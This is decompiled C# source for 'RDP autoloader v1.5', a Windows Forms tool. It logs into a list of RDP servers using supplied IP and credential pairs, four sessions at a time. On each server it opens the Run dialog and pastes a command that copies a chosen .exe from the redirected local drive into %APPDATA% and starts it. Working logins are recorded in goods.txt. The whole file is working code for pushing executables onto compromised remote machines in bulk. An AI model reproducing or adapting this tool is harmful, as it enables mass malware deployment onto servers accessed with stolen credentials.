// Decompiled with JetBrains decompiler
// Type: VdsFileUploader.Form1
// Assembly: VdsFileUploader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 82549BFD-A902-4CEB-96B1-21572FE5F771
// Assembly location: C:\Users\gorno\Desktop\vm\RDP AutoLoader v1.5\RDP autoloader v1.5.exe

using AxMSTSCLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace VdsFileUploader
{
  public class Form1 : Form
  {
    private static string[] curwinclasses = new string[3]
    {
      "UIMainClass",
      "UIContainerClass",
      "IHWindowClass"
    };
    private const int KEYEVENTF_EXTENDEDKEY = 1;
    private const int KEYEVENTF_KEYUP = 2;
    private const byte VK_LWIN = 91;
    private const int WM_KEYDOWN = 256;
    private const int WM_KEYUP = 257;
    private const int WM_CLOSE = 16;
    private const int WM_DESTROY = 2;
    private Queue<string> dedics;
    private bool Working;
    private string filepath;
    private string filename;
    private IntPtr formhwnd;
    private ManualResetEvent[] _ThreadSignals;
    private object csect;
    private object csectbuf;
    private object csectfile;
    private IContainer components;
    private TextBox t1;
    private GroupBox groupBox1;
    private Button go;
    private TextBox t2;
    private OpenFileDialog openFileDialog;
    private Button browse;
    private AxMsRdpClient6NotSafeForScripting rdp;
    private AxMsRdpClient6NotSafeForScripting rdp1;
    private AxMsRdpClient6NotSafeForScripting rdp3;
    private AxMsRdpClient6NotSafeForScripting rdp2;

    public Form1()
    {
      this.InitializeComponent();
      this.Working = false;
      this.formhwnd = this.Handle;
      this.csect = new object();
      this.csectbuf = new object();
      this.csectfile = new object();
    }

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(Form1.EnumWindowsProc enumProc, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int wMsg, uint wParam, uint lParam);

    private bool Checkrdp()
    {
      string[] array = this.dedics.ToArray();
      for (int index = 0; index < array.Length; ++index)
      {
        if (!array[index].Contains("@") || !array[index].Contains("."))
          return false;
      }
      return true;
    }

    private void browse_Click(object sender, EventArgs e)
    {
      try
      {
        int num = (int) this.openFileDialog.ShowDialog((IWin32Window) this);
        if (string.IsNullOrWhiteSpace(this.openFileDialog.FileName))
          return;
        this.t2.Text = this.openFileDialog.FileName;
        this.filename = this.openFileDialog.SafeFileName;
      }
      catch (Exception ex)
      {
      }
    }

    private void go_Click(object sender, EventArgs e)
    {
      if (this.Working)
      {
        int num1 = (int) MessageBox.Show((IWin32Window) this, "Already working!");
      }
      else
      {
        this.dedics = new Queue<string>((IEnumerable<string>) this.t1.Lines);
        if (this.dedics.Count < 1)
        {
          int num2 = (int) MessageBox.Show((IWin32Window) this, "There are no rdp servers!");
        }
        else if (!this.Checkrdp())
        {
          int num3 = (int) MessageBox.Show((IWin32Window) this, "Incorrect RDP strings format!");
        }
        else if (!this.t2.Text.Contains(":\\") || !this.t2.Text.Contains(".exe"))
        {
          int num4 = (int) MessageBox.Show((IWin32Window) this, "You need to browse the .exe file");
        }
        else
        {
          this.filepath = this.t2.Text;
          this.Working = true;
          Thread thread = new Thread(new ThreadStart(this.ControllerThreadProc));
          thread.IsBackground = true;
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start();
        }
      }
    }

    private void ControllerThreadProc()
    {
      ThrParams[] thrParamsArray = new ThrParams[4];
      this._ThreadSignals = new ManualResetEvent[4];
      for (int index = 0; index < 4; ++index)
      {
        this._ThreadSignals[index] = new ManualResetEvent(false);
        thrParamsArray[index] = new ThrParams();
        thrParamsArray[index].Ts = this._ThreadSignals[index];
      }
      thrParamsArray[0].Rdp = this.rdp;
      thrParamsArray[1].Rdp = this.rdp1;
      thrParamsArray[2].Rdp = this.rdp2;
      thrParamsArray[3].Rdp = this.rdp3;
      for (int index = 0; index < 4; ++index)
      {
        Thread thread = new Thread(new ParameterizedThreadStart(this.WorkThreadProc));
        thread.IsBackground = true;
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start((object) thrParamsArray[index]);
      }
      for (int index = 0; index < this._ThreadSignals.Length; ++index)
        WaitHandle.WaitAny(new WaitHandle[1]
        {
          (WaitHandle) this._ThreadSignals[index]
        });
      this.Working = false;
      int num;
      this.Invoke((Delegate) (() => num = (int) MessageBox.Show((IWin32Window) this, "Done!")));
    }

    private void WorkThreadProc(object thrparams)
    {
      AxMsRdpClient6NotSafeForScripting Rdp = ((ThrParams) thrparams).Rdp;
      string text = "cmd.exe /c copy /Y \"\\\\tsclient\\" + this.filepath.Replace(":", "") + "\" \"%APPDATA%\\" + this.filename + "\" && start \"\" \"%APPDATA%\\" + this.filename + "\"";
      string input = "";
      while (input != null)
      {
        try
        {
          Monitor.Enter((object) this.dedics);
          if (this.dedics.Count > 0)
          {
            input = this.dedics.Dequeue();
            this.t1.Invoke((Delegate) (() => this.t1.Lines = this.dedics.ToArray()));
          }
          else
            input = (string) null;
          Monitor.Exit((object) this.dedics);
          if (input != null)
          {
            Match match = new Regex("(?<ipport>[^\\@]+)\\@(?<logpass>.*)").Match(input);
            if (!match.Success)
              throw new Exception("Не могу распарсить дедик");
            string ip = match.Groups["ipport"].Value;
            int port = 0;
            if (ip.Contains(";") || ip.Contains(":"))
            {
              port = int.Parse(ip.Split(new char[2]
              {
                ';',
                ':'
              })[1]);
              ip = ip.Split(new char[2]{ ';', ':' })[0];
            }
            string login = match.Groups["logpass"].Value.Split(new char[2]
            {
              ';',
              ':'
            })[0];
            string pass = match.Groups["logpass"].Value.Split(new char[2]
            {
              ';',
              ':'
            })[1];
            string str = "/?log=" + input;
            this.Invoke((Delegate) (() =>
            {
              Rdp.Server = ip;
              if (port > 0)
                Rdp.AdvancedSettings2.RDPPort = port;
              Rdp.UserName = login;
              Rdp.AdvancedSettings7.ClearTextPassword = pass;
              Rdp.AdvancedSettings7.AuthenticationLevel = 0U;
              Rdp.AdvancedSettings7.EnableCredSspSupport = true;
              Rdp.AdvancedSettings2.overallConnectionTimeout = 30;
              Rdp.AdvancedSettings2.allowBackgroundInput = 1;
              Rdp.SecuredSettings2.KeyboardHookMode = 1;
              Rdp.ColorDepth = 16;
              Rdp.AdvancedSettings7.RedirectDrives = true;
              Rdp.Connect();
            }));
            int num = 0;
            while ((int) Rdp.Connected != 1)
            {
              Thread.Sleep(1000);
              ++num;
              if (num > 30)
                throw new Exception("Таймаут подключения");
              bool dialog = false;
              Monitor.Enter(this.csect);
              Form1.EnumWindows((Form1.EnumWindowsProc) ((wnd, param) =>
              {
                if (Form1.GetWindow(wnd, 4U) == this.formhwnd)
                {
                  StringBuilder lpClassName = new StringBuilder(256);
                  Form1.GetClassName(wnd, lpClassName, lpClassName.Capacity);
                  if (string.Compare(lpClassName.ToString(), "#32770") == 0)
                  {
                    dialog = true;
                    Thread.Sleep(500);
                    Form1.PostMessage(wnd, 273U, 2U, 0U);
                    Thread.Sleep(1000);
                    return false;
                  }
                  if (string.Compare(lpClassName.ToString(), "Credential Dialog Xaml Host", true) == 0)
                  {
                    dialog = true;
                    Thread.Sleep(500);
                    Form1.PostMessage(wnd, 2U, 0U, 0U);
                    Form1.PostMessage(wnd, 16U, 0U, 0U);
                    Thread.Sleep(1000);
                    return false;
                  }
                }
                return true;
              }), IntPtr.Zero);
              Monitor.Exit(this.csect);
              if (dialog)
                throw new Exception("Ошибка подключения (диалоговое окно, ошибка авторизации и пр)");
            }
            Thread.Sleep(12000);
            Monitor.Enter(this.csectfile);
            System.IO.File.AppendAllText("goods.txt", input + "\r\n");
            Monitor.Exit(this.csectfile);
            IntPtr hWindow = new IntPtr();
            this.Invoke((Delegate) (() => hWindow = Rdp.Handle));
            Thread.Sleep(200);
            hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, Form1.curwinclasses[0], (string) null);
            hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, Form1.curwinclasses[1], (string) null);
            hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, Form1.curwinclasses[2], (string) null);
            KeyboardSend.KeyDown(hWindow, Keys.LWin, true);
            KeyboardSend.KeyDown(hWindow, Keys.R, false);
            Thread.Sleep(100);
            KeyboardSend.KeyUp(hWindow, Keys.LWin, true);
            KeyboardSend.KeyUp(hWindow, Keys.R, false);
            Thread.Sleep(1000);
            Monitor.Enter(this.csectbuf);
            Clipboard.SetText(text);
            Thread.Sleep(500);
            KeyboardSend.KeyDown(hWindow, Keys.ControlKey, true);
            KeyboardSend.KeyDown(hWindow, Keys.V, false);
            KeyboardSend.KeyUp(hWindow, Keys.ControlKey, true);
            KeyboardSend.KeyUp(hWindow, Keys.V, false);
            Thread.Sleep(1000);
            KeyboardSend.KeyDown(hWindow, Keys.Return, false);
            KeyboardSend.KeyUp(hWindow, Keys.Return, false);
            Monitor.Exit(this.csectbuf);
            Thread.Sleep(40000);
            KeyboardSend.KeyDown(hWindow, Keys.Left, true);
            KeyboardSend.KeyUp(hWindow, Keys.Left, true);
            Thread.Sleep(1000);
            KeyboardSend.KeyDown(hWindow, Keys.Return, false);
            KeyboardSend.KeyUp(hWindow, Keys.Return, true);
            Thread.Sleep(15000);
          }
        }
        catch (Exception ex)
        {
          Monitor.Enter(this.csectfile);
          System.IO.File.AppendAllText("bugs.txt", input + " - " + ex.Message + "\r\n");
          Monitor.Exit(this.csectfile);
        }
        try
        {
          if ((int) Rdp.Connected > 0)
            Rdp.Disconnect();
          while ((int) Rdp.Connected != 0)
            Thread.Sleep(500);
          Thread.Sleep(1000);
        }
        catch (Exception ex)
        {
          Monitor.Enter(this.csectfile);
          System.IO.File.AppendAllText("bugs.txt", ex.Message + "\r\n");
          Monitor.Exit(this.csectfile);
        }
      }
      ((ThrParams) thrparams).Ts.Set();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.t1 = new TextBox();
      this.groupBox1 = new GroupBox();
      this.go = new Button();
      this.t2 = new TextBox();
      this.openFileDialog = new OpenFileDialog();
      this.browse = new Button();
      this.rdp = new AxMsRdpClient6NotSafeForScripting();
      this.rdp1 = new AxMsRdpClient6NotSafeForScripting();
      this.rdp3 = new AxMsRdpClient6NotSafeForScripting();
      this.rdp2 = new AxMsRdpClient6NotSafeForScripting();
      this.groupBox1.SuspendLayout();
      this.rdp.BeginInit();
      this.rdp1.BeginInit();
      this.rdp3.BeginInit();
      this.rdp2.BeginInit();
      this.SuspendLayout();
      this.t1.Dock = DockStyle.Fill;
      this.t1.Location = new Point(3, 16);
      this.t1.Multiline = true;
      this.t1.Name = "t1";
      this.t1.ScrollBars = ScrollBars.Both;
      this.t1.Size = new Size(213, 263);
      this.t1.TabIndex = 1;
      this.t1.Text = "123.123.123.123:54321@user;password";
      this.t1.WordWrap = false;
      this.groupBox1.Controls.Add((Control) this.t1);
      this.groupBox1.Location = new Point(12, 12);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(219, 282);
      this.groupBox1.TabIndex = 2;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "RDP servers (ip[:port]@login:pass)";
      this.go.Location = new Point(124, 323);
      this.go.Name = "go";
      this.go.Size = new Size(107, 23);
      this.go.TabIndex = 3;
      this.go.Text = "Start";
      this.go.UseVisualStyleBackColor = true;
      this.go.Click += new EventHandler(this.go_Click);
      this.t2.Location = new Point(12, 297);
      this.t2.Name = "t2";
      this.t2.ReadOnly = true;
      this.t2.Size = new Size(219, 20);
      this.t2.TabIndex = 4;
      this.openFileDialog.RestoreDirectory = true;
      this.browse.Location = new Point(12, 323);
      this.browse.Name = "browse";
      this.browse.Size = new Size(107, 23);
      this.browse.TabIndex = 6;
      this.browse.Text = "Browse";
      this.browse.UseVisualStyleBackColor = true;
      this.browse.Click += new EventHandler(this.browse_Click);
      this.rdp.Enabled = true;
      this.rdp.Location = new Point(247, 16);
      this.rdp.Name = "rdp";
      this.rdp.OcxState = (AxHost.State) componentResourceManager.GetObject("rdp.OcxState");
      this.rdp.Size = new Size(432, 330);
      this.rdp.TabIndex = 8;
      this.rdp1.Enabled = true;
      this.rdp1.Location = new Point(247, 352);
      this.rdp1.Name = "rdp1";
      this.rdp1.OcxState = (AxHost.State) componentResourceManager.GetObject("rdp1.OcxState");
      this.rdp1.Size = new Size(432, 330);
      this.rdp1.TabIndex = 9;
      this.rdp3.Enabled = true;
      this.rdp3.Location = new Point(685, 352);
      this.rdp3.Name = "rdp3";
      this.rdp3.OcxState = (AxHost.State) componentResourceManager.GetObject("rdp3.OcxState");
      this.rdp3.Size = new Size(432, 330);
      this.rdp3.TabIndex = 11;
      this.rdp2.Enabled = true;
      this.rdp2.Location = new Point(685, 16);
      this.rdp2.Name = "rdp2";
      this.rdp2.OcxState = (AxHost.State) componentResourceManager.GetObject("rdp2.OcxState");
      this.rdp2.Size = new Size(432, 330);
      this.rdp2.TabIndex = 10;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1131, 693);
      this.Controls.Add((Control) this.rdp3);
      this.Controls.Add((Control) this.rdp2);
      this.Controls.Add((Control) this.rdp1);
      this.Controls.Add((Control) this.rdp);
      this.Controls.Add((Control) this.browse);
      this.Controls.Add((Control) this.t2);
      this.Controls.Add((Control) this.go);
      this.Controls.Add((Control) this.groupBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = "Form1";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "RDP autoloader v1.5";
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.rdp.EndInit();
      this.rdp1.EndInit();
      this.rdp3.EndInit();
      this.rdp2.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
  }
}
